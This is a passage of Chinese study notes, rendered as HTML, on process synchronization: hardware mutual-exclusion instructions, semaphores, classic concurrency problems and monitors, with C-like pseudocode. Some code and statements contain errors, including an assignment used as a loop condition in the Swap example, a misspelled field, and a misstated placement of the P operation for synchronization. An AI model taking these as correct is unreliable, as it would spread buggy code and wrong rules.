class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">&amp;&amp;</span>turn<span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>critical section<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>flag<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>remainder section<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">//p2 进程</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>flag<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>turn<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">&amp;&amp;</span>turn<span class=\"token operator\">==</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>critical section<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>flag<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>remainder section<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token number\">12345678910111213141516</span></pre></td></tr></table></figure><p>遵循空闲让进、忙则等待、有限等待三个原则</p>\n<p>但是未遵循让权等待的原则</p>\n<h3 id=\"23_3-进程互斥的硬件实现方法\"><a class=\"markdownIt-Anchor\" href=\"#23_3-进程互斥的硬件实现方法\">#</a> 2.3_3 进程互斥的硬件实现方法</h3>\n<p>1、中断屏蔽方法</p>\n<p>关中断（不允许进程中断）</p>\n<p>临界区</p>\n<p>开中断</p>\n<p>简单、高校</p>\n<p>多处理机，可能会同时访问临界资源</p>\n<p>使用 OS 内核进程</p>\n<p>2、TestAndSet（TSL 指令）</p>\n<p>TSL 是用硬件实现的，上锁、检查一气呵成</p>\n<p>不满足让权等待，会盲等</p>\n<p>C 语言描述逻辑：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">//true 表示已经上锁</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>bool <span class=\"token function\">TestAndSet</span><span class=\"token punctuation\">(</span>bool <span class=\"token operator\">*</span>lock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    bool old<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    old<span class=\"token operator\">=</span><span class=\"token operator\">*</span>lock<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token operator\">*</span>lock<span class=\"token operator\">=</span>true<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">return</span> old<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">// 以下是使用 TSL 指令实现互斥的算法逻辑</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token function\">TestAndSet</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>lock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 上锁并检查</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>临界区代码段</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>lock<span class=\"token operator\">=</span>false<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 解锁</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token number\">12345678910111213</span></pre></td></tr></table></figure><p>3、Swap 指令</p>\n<p>别称：Exchange 指令、XCHG 指令</p>\n<p>Swap 指令是用硬件实现的</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">//true 表示已经上锁</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">Swap</span><span class=\"token punctuation\">(</span>bool <span class=\"token operator\">*</span>a<span class=\"token punctuation\">,</span>bool <span class=\"token operator\">*</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    bool temp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    temp<span class=\"token operator\">=</span><span class=\"token operator\">*</span>a<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token operator\">*</span>a<span class=\"token operator\">=</span><span class=\"token operator\">*</span>b<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token operator\">*</span>b<span class=\"token operator\">=</span>temp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">// 以下是使用 Swap 指令实现互斥的算法逻辑</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>bool old<span class=\"token operator\">=</span>true<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>old<span class=\"token operator\">=</span>true<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token function\">Swap</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>lock<span class=\"token punctuation\">,</span><span class=\"token operator\">&amp;</span>old<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>临界区代码段</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>lock<span class=\"token operator\">=</span>false<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 解锁</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">// 剩余代码段</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token number\">123456789101112131415</span></pre></td></tr></table></figure><p>简单</p>\n<p>适用多处理机</p>\n<p>不能让权等待</p>\n<h3 id=\"23_4-信号量机制\"><a class=\"markdownIt-Anchor\" href=\"#23_4-信号量机制\">#</a> 2.3_4 信号量机制</h3>\n<p>信号量：</p>\n<p>信号量是一种变量，表示系统中某种资源的数量</p>\n<p>一对原语：wait（S）原语和 signal（S）原语，分别简称 P（S）、V（S）</p>\n<p>1、整形信号量</p>\n<p>用一个整数表示系统资源的变量，用来表示系统中某种资源的数量</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> S<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">wait</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> S<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">//wait 原语，相当于：进入区</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>S<span class=\"token operator\">&lt;=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 如果资源数不够，就意志循环等待</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    S<span class=\"token operator\">=</span>S<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>        <span class=\"token comment\">// 如果资源数够，则占用一个资源</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">signal</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> S<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token comment\">//signal 原语，相当于 “退出区”</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    S<span class=\"token operator\">=</span>S<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>         <span class=\"token comment\">// 使用完资源后，在退出区释放资源</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token number\">123456789</span></pre></td></tr></table></figure><p>可能会出现盲等</p>\n<p>2、记录型信号量</p>\n<p>记录型数据结构表示的信号量</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 记录型信号量的定义</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">int</span> value<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">process</span> <span class=\"token operator\">*</span>L<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span> semaphore<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">// 某进程需要使用资源时，通过 wait 原语申请</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">wait</span> <span class=\"token punctuation\">(</span>semaphore S<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    S<span class=\"token punctuation\">.</span>value<span class=\"token operator\">--</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>S<span class=\"token punctuation\">.</span>value<span class=\"token operator\">&lt;</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token function\">block</span> <span class=\"token punctuation\">(</span>S<span class=\"token punctuation\">.</span>L<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 将该进程加入到消息队列中</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">// 进程使用完资源后，通过 signal 原语释放</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">signal</span> <span class=\"token punctuation\">(</span>semaphore S<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    S<span class=\"token punctuation\">.</span>value<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>S<span class=\"token punctuation\">.</span>valie<span class=\"token operator\">&lt;=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token function\">wakeup</span><span class=\"token punctuation\">(</span>S<span class=\"token punctuation\">.</span>L<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token number\">12345678910111213141516171819</span></pre></td></tr></table></figure><p>除非特别说明，否则默认 S 为记录型信号量</p>\n<h3 id=\"23_5-用信号量机制实现进程互斥-同步-前驱关系\"><a class=\"markdownIt-Anchor\" href=\"#23_5-用信号量机制实现进程互斥-同步-前驱关系\">#</a> 2.3_5 用信号量机制实现进程互斥、同步、前驱关系</h3>\n<p>1、实现进程互斥</p>\n<p>设置互斥信号量 mutex，初值为 1</p>\n<p>对不同的临界资源需要设置不同的互斥信号量</p>\n<p>PV 必须成对出现</p>\n<p>2、实现进程同步</p>\n<p>保证一前一后的操作顺序</p>\n<p>设置同步信号量 S，初始为 0</p>\n<p>在 “前操作” 之后执行 V（S）</p>\n<p>在 “后操作” 之后执行（V）</p>\n<p>3、实现进程的前驱关系</p>\n<p>1、要为每一对前驱关系各设置一个同步变量</p>\n<p>2、在 “前操作” 之后对相应的同步变量执行 V 操作</p>\n<p>3、在 “后操作” 之前对相应的同步变量执行 P 操作</p>\n<p><img data-src=\"F:/Typora%E6%88%AA%E5%9B%BE/e03e2a2147ac136fc5b50074b89844e8.png\" alt=\"img\"></p>\n<h3 id=\"23_6-生产者-消费者问题\"><a class=\"markdownIt-Anchor\" href=\"#23_6-生产者-消费者问题\">#</a> 2.3_6 生产者 - 消费者问题</h3>\n<p>（好像很幼稚的逻辑</p>\n<p>只有缓冲区没满时，生产者才能把产品放入缓冲区，否则必须等待</p>\n<p>只有缓冲区不空时，消费者才能从中取出产品，否则必须等待</p>\n<p>缓冲区是临界资源，各个进程互斥访问</p>\n<p>实现互斥的 P 操作要放在实现同步的 P 操作之后，不然会发生死锁</p>\n<p>V 操作不会导致进程发生阻塞的状态，所以可以交换</p>\n<p>使用操作不要放在临界区，不然并发度会降低</p>\n<h3 id=\"23_7-多生产者-多消费者模型\"><a class=\"markdownIt-Anchor\" href=\"#23_7-多生产者-多消费者模型\">#</a> 2.3_7 多生产者 - 多消费者模型</h3>\n<p>在生产 - 消费者问题中，如果缓冲区大小为 1，那么有可能不需要设置互斥信号量就可以实现互斥访问缓冲区</p>\n<p>分析同步问题是，应该从 “事件” 的角度来考虑</p>\n<p><img data-src=\"F:/Typora%E6%88%AA%E5%9B%BE/68b1e50aeeabfa85ad0126a7176deb5c.png\" alt=\"img\"></p>\n<h3 id=\"23_8-吸烟者问题\"><a class=\"markdownIt-Anchor\" href=\"#23_8-吸烟者问题\">#</a> 2.3_8 吸烟者问题</h3>\n<p>解决 “可以让生产多个产品的单生产者” 问题提供一个思路；</p>\n<p>若一个生产者要生产多种产品（或者说会引发多种前驱事件），那么各个 V 操作应该放在各自对应的 “事件” 发生之后的位置</p>\n<p><img data-src=\"F:/Typora%E6%88%AA%E5%9B%BE/40dc9cd7ea6625ed2be56e75b637ec5d.png\" alt=\"img\"></p>\n<h3 id=\"23_9-读者-写者问题\"><a class=\"markdownIt-Anchor\" href=\"#23_9-读者-写者问题\">#</a> 2.3_9 读者 - 写者问题</h3>\n<p>1、允许多个读者同时对文件执行读操作</p>\n<p>2、只允许一个写者往文件中写信息</p>\n<p>3、任一写者在完成写操作之前不允许其他读者或写者工作</p>\n<p>4、写者执行写操作前，应让已有的读者和写者全部退出</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>semaphore rw<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 用于实现对文件的互斥访问。表示当前是否有进程在访问共享文件</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">int</span> count<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 记录当前有几个读进程在访问文件</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>semaphore mutex<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 用于保证对 count 变量的互斥访问</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>semaphore w<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 用于实现 “写优先”</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token function\">writer</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        P（w）<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token function\">P</span><span class=\"token punctuation\">(</span>rw<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 写之前 “加锁”</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        写文件。。。</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        V（rw<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 写之后 “解锁”</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    \t<span class=\"token function\">V</span><span class=\"token punctuation\">(</span>w<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token function\">reader</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token function\">P</span><span class=\"token punctuation\">(</span>w<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t    <span class=\"token function\">P</span><span class=\"token punctuation\">(</span>mutex<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">// 各读进程互斥访问 count</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>count<span class=\"token operator\">==</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token function\">P</span><span class=\"token punctuation\">(</span>rw<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 第一个读进程的读进程数 + 1</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        count<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\t<span class=\"token comment\">// 访问文件的读进程数 + 1</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token function\">V</span><span class=\"token punctuation\">(</span>mutex<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token function\">V</span><span class=\"token punctuation\">(</span>w<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        读文件<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token function\">P</span><span class=\"token punctuation\">(</span>mutex<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token comment\">// 各读进程互斥访问 count</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        count<span class=\"token operator\">--</span><span class=\"token punctuation\">;</span>\t<span class=\"token comment\">// 访问文件的读进程数 - 1</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>count<span class=\"token operator\">==</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>            <span class=\"token function\">V</span><span class=\"token punctuation\">(</span>rw<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token comment\">// 最后一个读进程负责 “解锁”</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token function\">V</span><span class=\"token punctuation\">(</span>mutex<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token number\">1234567891011121314151617181920212223242526272829303132</span></pre></td></tr></table></figure><h3 id=\"23_10-哲学家进餐问题\"><a class=\"markdownIt-Anchor\" href=\"#23_10-哲学家进餐问题\">#</a> 2.3_10 哲学家进餐问题</h3>\n<p>五个人，必须拿左右的筷子才能吃饭</p>\n<p>避免死锁发生</p>\n<p>解决方案：<br>\n1、可以对哲学家进程施加一些限制条件，比如最多允许四个哲学家同时进餐，这样可以保证至少有一个哲学家是可以拿到左右两只筷子的。</p>\n<p>2、要求奇数号哲学家先拿左边的筷子，然后再拿右边的筷子，而偶数号哲学家刚好相反。用这种方法可以保证如果相邻的两个奇偶号哲学家都想吃饭，那么只会有其中一个可以拿起第一只筷子，另一个会直接阻塞。这就避免了占有一只后再等待另一只的情况。</p>\n<p>3、仅当一个哲学家左右两只筷子都可用时才允许他抓起筷子。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>semaphore chopstick<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>semaphore mutex <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 互斥地取筷子</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">Pi</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\t\t\t\t <span class=\"token comment\">//i 号哲学家的进程</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token function\">P</span><span class=\"token punctuation\">(</span>mutex<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token function\">p</span><span class=\"token punctuation\">(</span>chopstick<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>      <span class=\"token comment\">// 拿右</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token function\">p</span><span class=\"token punctuation\">(</span>chopstick<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 拿左</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token function\">V</span><span class=\"token punctuation\">(</span>mutex<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        吃饭<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token function\">V</span><span class=\"token punctuation\">(</span>chopstick<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token function\">V</span><span class=\"token punctuation\">(</span>chopstick<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        思考<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token number\">1234567891011121314</span></pre></td></tr></table></figure><h3 id=\"23_11-管程\"><a class=\"markdownIt-Anchor\" href=\"#23_11-管程\">#</a> 2.3_11 管程</h3>\n<p>1、为什么要引入管程</p>\n<p>PV 操作容易出错、困难</p>\n<p>2、管程的定义和基本特征</p>\n<p>定义：</p>\n<ul>\n<li>局部于管程的共享数据结构说明</li>\n<li>对该数据结构进程操作的一组过程</li>\n<li>对局部于管程的共享数据设置初始值的语句</li>\n<li>管程有一个名字</li>\n</ul>\n<p>基本特征：</p>\n<ul>\n<li>局部于管程数据结构只能被局部于管程的过程所访问</li>\n<li>一个进程只有通过调用管程内的过程才能进入管程访问共享数据</li>\n<li>每次仅允许一个进程在管程内执行某个内部过程</li>\n</ul>\n<p>心得：相当于 C++ 的类，管程是数据放在 private 中，函数放在 public 中</p>\n<p>拓展 1：用管程解决生产者消费者问题</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>monitor producerconsumer</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    condition full<span class=\"token punctuation\">,</span>empty<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">int</span> count <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">void</span> <span class=\"token function\">insert</span><span class=\"token punctuation\">(</span>Item item<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>count <span class=\"token operator\">==</span> N<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            <span class=\"token function\">wait</span><span class=\"token punctuation\">(</span>full<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        count<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token function\">insert_item</span> <span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>count <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td 